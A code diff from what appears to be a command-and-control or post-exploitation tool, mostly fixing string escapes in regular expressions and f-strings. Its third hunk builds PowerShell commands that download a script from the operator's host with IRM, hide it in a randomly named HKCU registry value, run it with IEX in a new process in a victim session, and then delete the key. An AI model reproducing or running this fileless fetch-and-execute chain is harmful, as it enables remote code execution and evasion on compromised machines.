@@ -692,7 +692,7 @@ class Completer(object):
 									
 			word_frag = line_buffer_list[-1].lower()
 
-			if re.search('payload=[\w\/\\\]{0,}', word_frag):
+			if re.search('payload=[\\w\\/\\\\]{0,}', word_frag):
 				
 				tmp = word_frag.split('=')
 
@@ -962,8 +962,8 @@ def main():
 
 
 				# Handle single/double quoted arguments
-				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
-				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
+				quoted_args_single = re.findall("'{1}[\\s\\S]*'{1}", user_input)
+				quoted_args_double = re.findall('"{1}[\\s\\S]*"{1}', user_input)
 				quoted_args = quoted_args_single + quoted_args_double
 				
 				if len(quoted_args):
@@ -1429,9 +1429,9 @@ def main():
 						rand_key = get_random_str(5)
 						value_name = get_random_str(5)
 						script_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'
-						reg_polution = f'New-Item -Path "HKCU:\SOFTWARE\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\SOFTWARE\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
-						exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
-						remove_src = f'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
+						reg_polution = f'New-Item -Path "HKCU:\\SOFTWARE\\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\SOFTWARE\\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
+						exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\\SOFTWARE\\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
+						remove_src = f'Remove-Item -Path "HKCU:\\Software\\{rand_key}" -Recurse'
 						new_proc = Exec_Utils.new_process_wrapper(f"{exec_script}; {func_name}; {remove_src}", session_id)
 						execution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)
 						
